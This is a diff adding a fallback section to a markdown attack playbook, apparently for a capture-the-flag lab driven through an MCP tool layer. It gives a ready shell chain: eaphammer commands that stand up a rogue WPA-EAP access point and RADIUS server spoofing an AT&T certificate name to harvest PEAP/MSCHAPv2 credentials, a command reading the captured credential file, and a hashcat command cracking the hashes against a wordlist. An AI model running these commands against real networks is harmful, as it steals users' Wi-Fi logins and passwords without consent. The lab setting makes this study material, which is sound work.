@@ -40,6 +40,34 @@ run_sequence([
 ])
 ```
 
+## MCP mapping / fallback
+
+`eaphammer_rogue` and `eaphammer_dump_creds` are **not in `src/`** —
+the current MCP `do_create_rogue_ap` only supports open/WPA-PSK, not
+WPA-EAP. Drive `eaphammer` on the attack host directly.
+
+**Fallback shell chain:**
+
+```bash
+# 1. one-shot rogue-RADIUS + rogue AP
+sudo eaphammer --interface wlan0 \
+    --essid "<target ESSID>" \
+    --auth wpa-eap \
+    --creds \
+    --channel 6 \
+    --negotiate manual \
+    --phase-1-methods PEAP \
+    --phase-2-methods MSCHAPV2 \
+    --cn "attwifi.att.net"
+
+# 2. read logged creds
+cat /root/eaphammer/loot/hostapd-*.creds
+# or feed straight into hashcat
+hashcat -m 5500 <alice-hash-line> /opt/wordlists/rockyou.txt
+```
+
+For hostapd-wpe as an alternative, see `rogue-radius-eap-flag.md` Path A.
+
 ## The flag surface
 
 - **MSCHAPv2 challenge/response** (crack with hashcat 5500 or
